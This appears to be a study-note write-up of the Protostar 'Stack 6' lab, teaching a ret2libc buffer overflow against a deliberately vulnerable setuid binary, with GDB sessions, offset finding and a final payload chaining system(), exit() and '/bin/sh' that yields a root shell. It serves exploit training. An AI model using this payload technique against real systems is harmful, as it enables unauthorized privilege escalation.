## No Executable Stack - ret2libc

> NX also known as DEP ( Data Execution Prevention ) 

If NX flag is on, we can't inject our shellcode to the stack. Thats why we need to use ret2libc technique.

**Stack 6** [ [Description](https://exploit.education/protostar/stack-six/) ]

source.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
- In this code, NX is not compiled security mechanism
- if ret contains 0xbf , the program called exit() 
- this mean we can't inject our shellcode to the stack

**Remember !**  

We learned how library is loaded into memory in this [ [Lesson - ELF Intro](https://github.com/LunaM00n/LOL-Pwn/blob/master/Notes/11.ELF_intro_and_Binary_Patching.md) ].

Loaded Library from stack6
```c
$ ldd stack6
        linux-gate.so.1 =>  (0xb7fe4000)
        libc.so.6 => /lib/libc.so.6 (0xb7e99000)
        /lib/ld-linux.so.2 (0xb7fe5000)
```
- We can return to libc ( this is not start with 0xbf and not stack )

**Why we need to return this C Library?**

system()
```c
$ strings -t x /lib/libc.so.6 | grep "__libc_system"
   f690 __libc_system
```

/bin/sh
```c
$ strings -t x  /lib/libc.so.6 | grep "/bin/sh"
 11f3bf /bin/sh
```
Command Execution
```c
system("/bin/sh");
```
**Dynamic Memory Mapping**

We can use GDB
```c
$ gdb -q ./stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break *main
Breakpoint 1 at 0x80484fa: file stack6/stack6.c, line 26.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffffd64) at stack6/stack6.c:26
26      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info proc map
process 1552
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```
- Now we know the start address of library in memory is `0xb7e97000`

**Calculating the address**

```c
Library Address + Offset 

# system()
(gdb) p system
$4 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

# "/bin/sh"
(gdb) x/s 0xb7e97000+0x11f3bf
0xb7fb63bf:      "/bin/sh"
```

**How to use this address and why?**

sys_test.c ( Ubuntu )
```c
#include <stdlib.h>

int main()
{
	system("/bin/sh");
}
```
Running
```c
luna@luna-LOL:~/Desktop/pwn$ gcc -mpreferred-stack-boundary=2 -o sys_test sys_test.c
luna@luna-LOL:~/Desktop/pwn$ ./sys_test
$ id
uid=1000(luna) gid=1000(luna) groups=1000(luna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
Debugging system() function call
```c
$ gdb -q ./sys_test
Reading symbols from ./sys_test...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+0>:     push   ebp
   0x0804840c <+1>:     mov    ebp,esp
   0x0804840e <+3>:     push   0x80484b0
   0x08048413 <+8>:     call   0x80482e0 <system@plt>
   0x08048418 <+13>:    add    esp,0x4
   0x0804841b <+16>:    mov    eax,0x0
   0x08048420 <+21>:    leave
   0x08048421 <+22>:    ret
End of assembler dump.
```
Break before call system()
```c
(gdb) break *main+8
Breakpoint 1 at 0x8048413
```
Defining hook
```c
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x $esp
>x/2i $eip
>end
```
run and examine stack
```c
(gdb) r
Starting program: /home/luna/Desktop/pwn/sys_test
0xbffff524:     0x080484b0      0x00000000      0xb7e21637      0x00000001
0xbffff534:     0xbffff5c4      0xbffff5cc      0x00000000      0x00000000
0xbffff544:     0x00000000      0xb7fbb000      0xb7fffc04      0xb7fff000
0xbffff554:     0x00000000      0xb7fbb000      0xb7fbb000      0x00000000
0xbffff564:     0x04ba9dfc      0x3f7b13ec      0x00000000      0x00000000
0xbffff574:     0x00000000      0x00000001      0x08048310      0x00000000
0xbffff584:     0xb7ff0010      0xb7fea880      0xb7fff000      0x00000001
0xbffff594:     0x08048310      0x00000000      0x08048331      0x0804840b
=> 0x8048413 <main+8>:  call   0x80482e0 <system@plt>
   0x8048418 <main+13>: add    esp,0x4

Breakpoint 1, 0x08048413 in main ()

(gdb) x/s 0x080484b0
0x80484b0:      "/bin/sh"
```
- When system() get called, the `address` at the top of the stack is the argument for system()

**Overflow Detection**
Test Running
```c
$ ./stack6
input path please: a
got path a
```
Pattern Creation and Test 
```c
# on my Windows Hosts
D:\LOL Pwn>python pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# Protostar
$ ./stack6
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Segmentation fault
```
Crash point
```c
$ gdb -q ./stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) set disassembly-flavor intel
(gdb) disas getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
---Type <return> to continue, or q <return> to quit---
0x080484f9 <getpath+117>:       ret
End of assembler dump.

# Break at ret
(gdb) break *getpath+117
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.


# Defining Hook Stop
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x $esp
>i r
>x/2i $eip
>end
(gdb) run
Starting program: /opt/protostar/bin/stack6
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
0xbffffcac:     0x37634136      0x41386341      0x64413963      0x31644130
0xbffffcbc:     0x41326441      0x00000000      0xbffffd64      0xbffffd6c
0xbffffccc:     0xb7fe1848      0xbffffd20      0xffffffff      0xb7ffeff4
0xbffffcdc:     0x080482a1      0x00000001      0xbffffd20      0xb7ff0626
0xbffffcec:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffffcfc:     0x00000000      0xbffffd38      0x1a5a310f      0x301bc71f
0xbffffd0c:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffffd1c:     0x080483d0      0x00000000      0xb7ff6210      0xb7eadb9b
eax            0x6e     110
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffcac       0xbffffcac
ebp            0x63413563       0x63413563
esi            0x0      0
edi            0x0      0
eip            0x80484f9        0x80484f9 <getpath+117>
eflags         0x200292 [ AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x80484f9 <getpath+117>:        ret
0x80484fa <main>:       push   ebp

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) ni
Cannot access memory at address 0x63413567

# Seg Fault
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0xbffffcb0:     0x41386341      0x64413963      0x31644130      0x41326441
0xbffffcc0:     0x00000000      0xbffffd64      0xbffffd6c      0xb7fe1848
0xbffffcd0:     0xbffffd20      0xffffffff      0xb7ffeff4      0x080482a1
0xbffffce0:     0x00000001      0xbffffd20      0xb7ff0626      0xb7fffab0
0xbffffcf0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffffd00:     0xbffffd38      0x1a5a310f      0x301bc71f      0x00000000
0xbffffd10:     0x00000000      0x00000000      0x00000001      0x080483d0
0xbffffd20:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
eax            0x6e     110
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffcb0       0xbffffcb0
ebp            0x63413563       0x63413563
esi            0x0      0
edi            0x0      0
eip            0x37634136       0x37634136
eflags         0x210292 [ AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x37634136:     Error while running hook_stop:
Cannot access memory at address 0x37634136
0x37634136 in ?? ()
(gdb)
```
Calculate Offset
```c
D:\LOL Pwn>python pattern.py 0x37634136
Pattern 0x37634136 first occurrence at position 80 in pattern.
```
Controlling EIP
```c
$ python -c 'print "A"*80+"B"*4+"CCCC"' > /tmp/0

# Debug
$ gdb -q ./stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break *getpath+117
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>i r
>x/32x $esp
>x/2i $eip
>end
(gdb) run < /tmp/0
Starting program: /opt/protostar/bin/stack6 < /tmp/0
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBBCCCC
eax            0x62     98
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffcac       0xbffffcac
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x80484f9        0x80484f9 <getpath+117>
eflags         0x200292 [ AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffffcac:     0x42424242      0x43434343      0x00000000      0xbffffd38
0xbffffcbc:     0xb7eadc76      0x00000001      0xbffffd64      0xbffffd6c
0xbffffccc:     0xb7fe1848      0xbffffd20      0xffffffff      0xb7ffeff4
0xbffffcdc:     0x080482a1      0x00000001      0xbffffd20      0xb7ff0626
0xbffffcec:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffffcfc:     0x00000000      0xbffffd38      0x635c63b7      0x491d95a7
0xbffffd0c:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffffd1c:     0x080483d0      0x00000000      0xb7ff6210      0xb7eadb9b
0x80484f9 <getpath+117>:        ret
0x80484fa <main>:       push   %ebp

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) ni
Cannot access memory at address 0x41414145
(gdb)

Program received signal SIGSEGV, Segmentation fault.
eax            0x62     98
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffcb0       0xbffffcb0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x210292 [ AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffffcb0:     0x43434343      0x00000000      0xbffffd38      0xb7eadc76
0xbffffcc0:     0x00000001      0xbffffd64      0xbffffd6c      0xb7fe1848
0xbffffcd0:     0xbffffd20      0xffffffff      0xb7ffeff4      0x080482a1
0xbffffce0:     0x00000001      0xbffffd20      0xb7ff0626      0xb7fffab0
0xbffffcf0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffffd00:     0xbffffd38      0x635c63b7      0x491d95a7      0x00000000
0xbffffd10:     0x00000000      0x00000000      0x00000001      0x080483d0
0xbffffd20:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0x42424242:     Error while running hook_stop:
Cannot access memory at address 0x42424242
0x42424242 in ?? ()
```
**Payload** 

```c
A"*80 ( JUNK ) + "system()" + "/bin/sh"
```
system() address -> `0xb7ecffb0` -> `\xb0\xff\xec\xb7`

"/bin/sh" address -> `0xb7fb63bf`  -> `\xbf\x63\xfb\xb7`

Payload 1 ( Failed )
```c
python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xbf\x63\xfb\xb7"' | ./stack6
Segmentation Fault
```

**Reading GLIBC system.c** [ [source](https://github.com/lattera/glibc/blob/master/sysdeps/posix/system.c#L41) ]

we called __libc_system() and its called do_system
```c
int __libc_system (const char *line)
{

if (line == NULL)

/* Check that we have a command processor available. It might

not be available after a chroot(), for example. */

return do_system ("exit 0") == 0;

return do_system (line);

}
```
- As you can see it called `2 times` to `do_system`
- Passed with 2 argument
- The first one is not our argument, thats why our "/bin/sh" having a trouble

do_system summary
```c
#define	SHELL_PATH	"/bin/sh"	/* Path of the shell.  */
#define	SHELL_NAME	"sh"		/* Name to give it.  */

static int do_system (const char *line)
{
...snip...
__fork();

if (pid == (pid_t) 0)
    {
      /* Child side.  */
      const char *new_argv[4];
      new_argv[0] = SHELL_NAME;
      new_argv[1] = "-c";
      new_argv[2] = line;
      new_argv[3] = NULL;

/* Restore the signals. */
(void) __sigaction (SIGINT, &intr, (struct sigaction *) NULL);
(void) __sigaction (SIGQUIT, &quit, (struct sigaction *) NULL);
(void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);
INIT_LOCK ();

/* Exec the shell.  */
      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
      _exit (127);
    }
 ...snip....
 return status;
}
```
**Deep Debugging**

Debug __libc_system with following payload
```c
python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xbf\x63\xfb\xb7"' > /tmp/0
```
Let's check assembly code ( we need to examine stack )

*Note * I used gdb logging for clear version* 
```c
set logging file /tmp/ds.txt
set logging on
disas do_system

set logging off
set logging file /tmp/sys.txt
set logging on
disas __libc_system
```
RET in  __libc_system
```c
0xb7ed0013 <__libc_system+99>:  ret
```
Return of __libc_system
- Start program with payload 
- when first breakpoint hit 
```c
(gdb) break *__libc_system+99
Breakpoint 5 at 0xb7ed0013: file ../sysdeps/posix/system.c, line 195.
(gdb) c
Continuing.
0xbffffcb0:     0xb7fb63bf      0x00000000      0xbffffd38      0xb7eadc76
0xbffffcc0:     0x00000001      0xbffffd64      0xbffffd6c      0xb7fe1848
0xbffffcd0:     0xbffffd20      0xffffffff      0xb7ffeff4      0x080482a1
0xbffffce0:     0x00000001      0xbffffd20      0xb7ff0626      0xb7fffab0
0xbffffcf0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffffd00:     0xbffffd38      0x7cdf7902      0x569e8f12      0x00000000
0xbffffd10:     0x00000000      0x00000000      0x00000001      0x080483d0
0xbffffd20:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0xb7ed0013 <__libc_system+99>:  ret
0xb7ed0014 <__libc_system+100>: call   0xb7f6fb10 <__libc_enable_asynccancel>

Breakpoint 5, 0xb7ed0013 in __libc_system (line=0x1 <Address 0x1 out of bounds>) at ../sysdeps/posix/system.c:195
195     in ../sysdeps/posix/system.c
```
- We noticed ret is about to use '/bin/sh' address as EIP

**Facts**
- do_system already clone child process 
- __libc_sytem's return value may cause segementation fault 

What about exit() address as libc_system's return address?

```c
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

# Hex
\xc0\x60\xec\xb7
```

**Final Payload**

Payload Idea
```c
A"*80 ( JUNK ) + "system()" + exit() +"/bin/sh"
```
Test
```c
$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\xbf\x63\xfb\xb7"';cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒AAAAAAAAAAAA▒▒▒▒`췿c▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
Strace - [clone](https://www.man7.org/linux/man-pages/man2/clone.2.html)
```c
rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffffce8) = 2024
waitpid(2024,
exit
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 2024
rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD (Child exited) @ 0 (0) ---
exit_group(-1073742592)                 = ?
```

**Another Technique for /bin/sh string**
```c
https://www.shellblade.net/files/docs/ret2libc.pdf
```
